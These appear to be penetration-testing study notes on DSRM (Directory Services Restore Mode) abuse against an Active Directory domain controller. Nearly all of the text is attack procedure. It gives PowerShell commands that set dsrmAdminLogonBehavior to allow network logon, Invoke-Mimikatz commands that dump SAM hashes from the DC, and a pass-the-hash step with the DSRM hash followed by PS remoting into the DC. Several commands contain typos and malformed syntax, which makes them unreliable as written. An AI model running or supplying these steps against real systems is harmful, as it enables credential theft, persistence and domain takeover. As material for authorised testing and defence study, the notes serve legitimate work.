DSRM (Directory Services Restore Mode)

• It is basically the safe mode for any DC. 
• Not similar to the Administrator password on DC machine.
• By default, this credential is not allowed to logon over the network to the DC. 
• Always have a word about this with the stakeholder as it create new vulnerabililty in the environment.
• The hash for DSRM user can be used to authenticate. This can be achieved by changing the property for the following
   ◇ HKLM:\System\CurrentControlSet\Control\Lsa\

• If property doesn't exists then (Run the following on the DC as DA)
   ◇ Net-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "dsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD -Verbose

• If the property exists then (Run the following on the DC as DA)
   ◇ Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "dsrmAdminLogonBehavior" -Value 2

Execute Mimikatz on DC and get all the hashes (Including DSRM password) --> Needs Domain admin rigths to run
• Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' - Computername domain_controller_name → Spits out the password for all local accounts as it makes use of SAM for retrieval and nol LSASS process.

The below command can be used to access Domain Controller Access (Needs to be run as Local Administrator)
• Invoke-Mimikatz -Command '"sekurlsa::pth /domain::DOMAIN_Controller_Name /user:Administrator /ntlm: hash_for_DSRM_user /run:powwershell.exe"' 
• Enter-PSSession -Computername /domain::DOMAIN_FQDN_Name → Using PS remoting to access the DC
